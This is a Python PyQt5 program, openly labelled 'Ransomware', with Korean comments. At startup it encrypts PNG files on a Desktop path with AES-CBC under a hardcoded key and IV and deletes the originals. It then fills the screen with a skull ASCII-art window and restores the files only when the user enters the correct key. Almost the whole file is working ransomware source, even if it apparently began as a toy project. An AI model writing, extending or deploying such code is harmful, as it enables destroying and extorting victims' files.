import sys,os, glob
import timeit
from PyQt5.QtWidgets import *
from Crypto.Cipher import AES # AES using
from Crypto.Util import Padding

def encryptFile(password, IV, infilename, outfilename):
		key = password.encode()
		with open(infilename, 'rb') as f:
			file_data = f.read()
		starttime = timeit.default_timer()

		cipher = AES.new(key, AES.MODE_CBC, IV)
		padded_file_data = Padding.pad(file_data,16)
		encrypted_file_data = cipher.encrypt(padded_file_data)

		time = timeit.default_timer() - starttime
		os.remove(infilename)									# 변경 전 파일은 삭제
		with open(outfilename,'wb') as ef:
			ef.write(encrypted_file_data)
		return 'Done! ' + str(time) + ' second(s)'

def decryptFile(password, iv, infilename, outfilename):
		key = password.encode()
		with open(infilename, 'rb') as ef:
			enc_file_data = ef.read()

		starttime = timeit.default_timer()

		cipher = AES.new(key, AES.MODE_CBC, iv)
		dec_file_data = cipher.decrypt(enc_file_data)
		file_data = Padding.unpad(dec_file_data,16)

		time = timeit.default_timer() - starttime
		os.remove(infilename)									# 변경 전 파일은 삭제
		with open(outfilename,'wb') as df:
			df.write(file_data)
		return 'Done! ' + str(time) + ' second(s)'

class MyWidget(QWidget):
	def __init__(self):
		super().__init__()
		self.key = key
		self.it = iv
		#self.encbtn = QPushButton('encrypt')
		self.decbtn = QPushButton('decrypt')
		self.logtb = QTextBrowser()
		self.keyedt = QTextEdit()
		self.initWidget()							# Widget 초기화
		
		self.btnhbox = QHBoxLayout()
		self.edthbox = QHBoxLayout()
		self.vbox = QVBoxLayout()
		self.initLayout()							# Layout 초기화
		
		self.logtb.append("===============================ENCRYPT FILE LIST===============================")
		for infilename in glob.iglob(encstartPath, recursive=True):
			if(os.path.isfile(infilename)):
				outfilename = infilename +'.enc'
				time = encryptFile(key, iv, infilename, outfilename)
				self.logtb.append('Encrypting> ' + infilename + ' -> ' + outfilename +'\t' + time)
		self.logtb.append("===============================ENCRYPT FILE LIST===============================")
		
		self.decbtn.clicked.connect(self.decrypt)
		
		self.setLayout(self.vbox)
		
	def initWidget(self):
		#self.encbtn.setToolTip('이버튼을 누르면  <b>암호화</b> 됩니다')
		self.decbtn.setToolTip('이버튼을 누르면 <b>복호화</b> 됩니다')
		self.logtb.setFixedHeight(800)
		self.logtb.setStyleSheet("background-color: black;"
								"color: white;")
		self.keyedt.setFixedHeight(30)
		self.keyedt.setFixedWidth(600)
		self.keyedt.setPlaceholderText('input key')
				
		self.logtb.append("⠀⠀⠀⠀⠀⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀")
		self.logtb.append("⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀")
		self.logtb.append("⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀")
		self.logtb.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀")
		self.logtb.append("⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀")
		self.logtb.append("⠀⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠀⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
		self.logtb.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
		
	def initLayout(self):
		self.btnhbox.addStretch(1)
		# self.btnhbox.addWidget(self.encbtn)
		self.btnhbox.addWidget(self.decbtn)
		self.btnhbox.addStretch(1)
		
		self.edthbox.addStretch(1)
		self.edthbox.addWidget(self.keyedt)
		self.edthbox.addStretch(1)
		
		self.vbox.addWidget(self.logtb)
		self.vbox.addLayout(self.edthbox)
		self.vbox.addLayout(self.btnhbox)
	
	def decrypt(self):
		inputkey = self.keyedt.toPlainText()
		
		if inputkey == "" :
			QMessageBox.warning(self, "No key.", "Please enter your key.")
			return
		elif inputkey != key:
			QMessageBox.warning(self, "You entered the wrong key.", inputkey)
			return
		self.logtb.clear()
		self.logtb.append("===============================DECRYPT FILE LIST===============================")
		for infilename in glob.iglob(decstartPath, recursive=True):
			if(os.path.isfile(infilename)):
				outfilename = infilename[:-4]
				time = decryptFile(key, iv, infilename, outfilename)
				self.logtb.append('Decrypting> ' + infilename + ' -> ' + outfilename + '\t' + time)	
		self.logtb.append("===============================DECRYPT FILE LIST===============================")

		QMessageBox.information(self, "Clear", inputkey)
	
class MyWindow(QMainWindow):
	def __init__(self):
		super().__init__()
		self.initUI()
		
	def initUI(self):
		self.setWindowTitle('Ransomware')
		self.statusBar().showMessage('linux-pyqt5-ransomware-1.0v')
		
		wg = MyWidget()
		self.setCentralWidget(wg)
		self.showMaximized()
		
key = 'my name is key12'
encstartPath = '/home/parallels/Desktop/*.png'				
decstartPath = '/home/parallels/Desktop/*.enc'
iv = b'my name is iv123'

if __name__ == "__main__" :
	app = QApplication(sys.argv)
	window = MyWindow()
	window.show()
	app.exec_()
